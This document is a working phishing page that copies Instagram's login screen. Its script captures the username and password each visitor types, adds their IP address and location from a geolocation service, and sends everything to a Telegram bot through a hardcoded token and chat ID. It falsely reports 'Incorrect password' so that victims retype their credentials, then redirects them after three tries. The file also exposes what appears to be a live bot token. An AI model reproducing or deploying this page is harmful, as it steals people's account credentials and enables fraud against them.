<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- FAVICON -->
    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
    <!-- GOOGLE FONT -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,500;1,700&display=swap" rel="stylesheet">
    
    <style>
        .container {
            font-family: 'Roboto', sans-serif;
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        .form-content {
            background: white;
            border: 1px solid #e6e6e6;
            padding: 20px;
            border-radius: 1px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .animate-input span {
            display: block;
            color: #999;
            font-size: 12px;
            margin-bottom: 5px;
        }
        .animate-input input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dbdbdb;
            background: #fafafa;
            border-radius: 3px;
        }
        .btn-login {
            background: #3897f0;
            color: white;
            border: none;
            padding: 10px 20px;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn-fb {
            background: #3b5998;
            color: white;
            border: none;
            padding: 10px 20px;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-fb img {
            vertical-align: middle;
            margin-right: 5px;
        }
        .error-message {
            color: red;
            margin-top: 10px;
            text-align: center;
        }
        .divine {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 10px 0;
        }
        .divine div {
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divine div:not(:last-child) {
            margin-right: 10px;
        }
        .goto {
            text-align: center;
            margin-top: 20px;
        }
        .goto a {
            color: #3897f0;
            text-decoration: none;
        }
        .app-download {
            text-align: center;
            margin-top: 20px;
        }
        .store-link img {
            width: 130px;
            margin: 5px;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
        }
        .footer a {
            color: #003569;
            margin: 0 10px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="form-content box">
        <div class="logo">
            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
        </div>
        <form id="contactForm">
            <div class="form-group">
                <div class="animate-input">
                    <span>Phone number, username or email</span>
                    <input type="text" name="username" id="username" required>
                    <input type="hidden" name="_captcha" value="false">
                </div>
            </div>
            <div class="form-group">
                <div class="animate-input">
                    <span>Password</span>
                    <input type="password" name="password" id="password" required>
                    <button type="button" onclick="togglePassword()">Show</button>
                </div>
            </div>
            <div class="btn-group">
                <button class="btn-login" type="submit">Log In</button>
            </div>
            <div class="divine">
                <div></div>
                <div>OR</div>
                <div></div>
            </div>
            <div id="error-message" class="error-message"></div>
            <div class="btn-group">
                <button class="btn-fb">
                    <img src="./images/facebook-icon.png" alt="">
                    <span>Log in with Facebook</span>
                </button>
            </div>
            <a href="#" class="forgot-pw">Forgot password?</a>
            <input type="hidden" id="attempt" name="attempt" value="0">
        </form>
    </div>
    <div class="goto">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
    <div class="app-download">
        <p>Get the app.</p>
        <div class="store-link">
            <a href="#"><img src="./images/app-store.png" alt="app store"></a>
            <a href="#"><img src="./images/gg-play.png" alt="google play"></a>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Hashtags</a>
            <a href="#">Locations</a>
            <a href="#" id="darkmode-toggle">Darkmode</a>
        </div>
        <div class="copyright">
            Â© 2024 Instagram from Meta
        </div>
    </div>
</div>

<script>
    let attemptCount = 0;

    function togglePassword() {
        var passwordInput = document.getElementById("password");
        var showButton = passwordInput.nextElementSibling;
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            showButton.textContent = "Hide";
        } else {
            passwordInput.type = "password";
            showButton.textContent = "Show";
        }
    }

    async function fetchGeoInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (response.ok) {
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    state: data.region
                };
            } else {
                throw new Error('Failed to fetch IP information');
            }
        } catch (error) {
            console.error(error);
            return null;
        }
    }

    async function handleLogin(event) {
        event.preventDefault();
        attemptCount++;
        const form = document.getElementById("contactForm");
        const errorMessage = document.getElementById("error-message");

        const geoInfo = await fetchGeoInfo();
        if (!geoInfo) {
            errorMessage.textContent = "Failed to fetch IP information. Please try again.";
            return;
        }

        document.getElementById("attempt").value = "Attempt " + attemptCount;

        // Prepare the message to send to Telegram
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const { ip, country, state } = geoInfo;
        const app = 'Instagram';
        const textMessage = `*New login attempt:* \n*Username:* ${username}\n*Password:* ${password}\n*IP Address:* ${ip}\n*Country:* ${country}\n*State:* ${state}\n*App:* ${app}\n*Attempt:* Attempt ${attemptCount}`;

        const chatId = '7735490302'; // Replace with your actual chat ID
        const token = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20'; // Replace with your actual bot token

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;

        // Send the message using fetch
        fetch(url, {
            method: "POST"
        }).then(response => response.json()).then(data => {
            if (data.ok) {
                console.log('Message sent successfully!');
            } else {
                console.log('Failed to send message.');
            }
        }).catch(error => {
            console.error('Error:', error);
            console.log('Error sending message.');
        });

        if (attemptCount >= 3) {
            window.location.href = "flock.html"; // Replace with the actual URL you want to redirect to
        } else {
            errorMessage.textContent = "Incorrect password. Try again.";
        }

        // Hide the error message when the user starts typing again
        document.getElementById("username").addEventListener("input", () => errorMessage.textContent = "");
        document.getElementById("password").addEventListener("input", () => errorMessage.textContent = "");
    }

    document.getElementById("contactForm").addEventListener("submit", handleLogin);
</script>
</body>
</html>
